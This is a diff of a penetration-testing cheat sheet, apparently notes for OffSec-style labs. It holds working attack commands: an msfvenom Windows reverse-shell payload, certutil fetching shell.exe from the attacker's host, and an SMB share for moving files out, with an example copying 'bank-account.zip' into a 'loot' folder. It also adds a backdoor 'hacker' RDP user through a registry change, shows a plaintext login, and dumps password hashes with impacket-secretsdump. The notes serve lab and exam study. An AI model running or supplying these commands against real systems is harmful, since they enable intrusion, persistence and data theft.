@@ -185,7 +185,7 @@ rdesktop -u 'Nathan' -p 'abc123//' 192.168.129.59 -g 94% -d OFFSEC
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=<your kali IP> LPORT=<port you designated> -f exe -o ~/shell.exe
 ````
 ## File Transfer <img src="https://cdn-icons-png.flaticon.com/512/1037/1037316.png" width="40" height="40" />
-### SMB
+### SMB Linux to Windows
 ````
 smbserver.py -smb2support Share .
 cmd.exe /c //<your kali IP>/Share/<file name you want>
@@ -200,12 +200,21 @@ smbserver.py -smb2support Share .
 net use \\<your kali IP>\share
 copy \\<your kali IP>\share\whoami.exe
 ````
-### Windows http server
+### Windows http server Linux to Windows
 ````
 python3 -m http.server 80
 certutil -urlcache -split -f http://<your kali IP>/shell.exe C:\\Windows\temp\shell.exe
 ````
-### Windows to Linux
+### SMB Server Bi-directional
+````
+smbserver.py -smb2support Share .
+mkdir loot #transfering loot to this folder
+net use * \\192.168.119.183\share
+copy Z:\<file you want from kali>
+copy C:\bank-account.zip Z:\loot #Transfer files to the loot folder on your kali machine
+````
+
+### PHP Script Windows to Linux
 ````
 cat upload.php
 chmod +x upload.php
@@ -529,7 +538,9 @@ net localgroup "Remote Desktop Users" hacker /add
 reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
 net users #check the new user
 ````
-
+````
+impacket-secretsdump hacker:password@<IP of victim machine> -outputfile hashes 
+````
 ## Active Directory <img src="https://www.outsystems.com/Forge_CW/_image.aspx/Q8LvY--6WakOw9afDCuuGXsjTvpZCo5fbFxdpi8oIBI=/active-directory-core-simplified-2023-01-04%2000-00-00-2023-02-07%2007-43-45" width="40" height="40" />
 
 ### Active Directory Enumeration <img src="https://cdn-icons-png.flaticon.com/512/9616/9616012.png" width="40" height="40" />
